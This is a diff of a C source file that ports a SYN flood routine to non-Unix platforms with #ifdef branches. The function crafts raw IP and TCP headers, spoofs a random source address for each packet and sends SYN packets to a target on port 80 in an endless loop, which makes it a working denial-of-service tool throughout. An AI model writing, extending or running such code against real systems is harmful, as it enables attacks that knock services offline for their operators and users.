@@ -10,12 +10,10 @@
 
 #include <string.h>
 #include <stdlib.h>
-#include <arpa/inet.h>
-#include <netinet/ip.h>
 #include <stdio.h>
 #include <time.h>
 
-//#include "../include/sockets.h"
+#include "../include/sockets.h"
 
 
 /*
@@ -63,7 +61,7 @@ random_port(void) {
  */
 uint16_t
 csum(uint16_t *psh, size_t psh_size) {
-    register int32_t    sum ;
+    register int32_t    sum;
     uint16_t            oddbyte;
     register int16_t    answer;
 
@@ -107,13 +105,20 @@ syn_flood(int16_t socket_fd) {
     destination_address.sin_family = AF_INET;
     destination_address.sin_addr.s_addr = inet_addr(destination_ip);
     destination_address.sin_port = htons(destination_port);
+    #ifdef __unix__
     struct iphdr        *ip_header = (struct iphdr *)datagram;
-
+    #else
+    struct ip_hdr       *ip_header = (struct ip_hdr *)datagram;
+    #endif
     memset(datagram, 0, sizeof datagram);
     ip_header->ihl = 5;
     ip_header->version = 4;
     ip_header->tos = 0;
+    #ifdef __unix__
     ip_header->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
+    #else
+    ip_header->tot_len = sizeof(struct ip_hdr) + sizeof(struct tcp_hdr);
+    #endif
     ip_header->id = htons(17712);
     ip_header->frag_off = 0;
     ip_header->ttl = 255;
@@ -122,7 +127,14 @@ syn_flood(int16_t socket_fd) {
     ip_header->saddr = inet_addr(random_ip());
     ip_header->daddr = destination_address.sin_addr.s_addr;
     ip_header->check = csum((uint16_t *)datagram, ip_header->tot_len >> 1);
-    struct tcphdr   *tcp_header = (struct tcphdr *)(datagram + sizeof(struct ip));
+
+    #ifdef __unix__
+    struct tcphdr   *tcp_header = (struct tcphdr *)(datagram +
+                                                    sizeof(struct ip));
+    #else
+    struct tcp_hdr  *tcp_header = (struct tcp_hdr *)(datagram +
+                                   sizeof(struct ip_hdr));
+    #endif
 
     tcp_header->source = htons(random_port());
     tcp_header->dest = htons(80);
@@ -146,6 +158,7 @@ syn_flood(int16_t socket_fd) {
     psh.protocol = IPPROTO_TCP;
     psh.tcp_length = htons(20);
 
+    #ifdef __unix__
     uint8_t         ip_hdrincl_flag = 1;
     const uint8_t   *hdrincl_flag_p = &ip_hdrincl_flag;
 
@@ -153,6 +166,7 @@ syn_flood(int16_t socket_fd) {
                    sizeof ip_hdrincl_flag) < 0) {
         return;
     }
+    #endif
     srand(time(0));
     while (1) {
         char        *generated_ip;
@@ -164,6 +178,7 @@ syn_flood(int16_t socket_fd) {
         tcp_header->source = htons(generated_port);
         psh.source_address = inet_addr(source_ip);
         tcp_header->check = csum((uint16_t *) &psh, sizeof(pseudo_header));
+        #ifdef __unix__
         memcpy(&psh.tcp, tcp_header, sizeof(struct tcphdr));
         if (sendto(new_sock, datagram, ip_header->tot_len, 0,
                    (struct sockaddr *) &destination_address,
@@ -174,6 +189,16 @@ syn_flood(int16_t socket_fd) {
             free(generated_ip);
             continue;
         }
+        #else
+        memcpy(&psh.tcp, tcp_header, sizeof(struct tcp_hdr));
+        if (sendto(new_sock, datagram, ip_header->tot_len, 0,
+                   (struct sockaddr *) &destination_address,
+                   sizeof destination_address) > 0) {
+            free(generated_ip);
+//        pcap_sendpacket(new_sock , datagram , ip_header->tot_len);
+//        free(generated_ip);
+        }
+        #endif
         return;
     }
 }
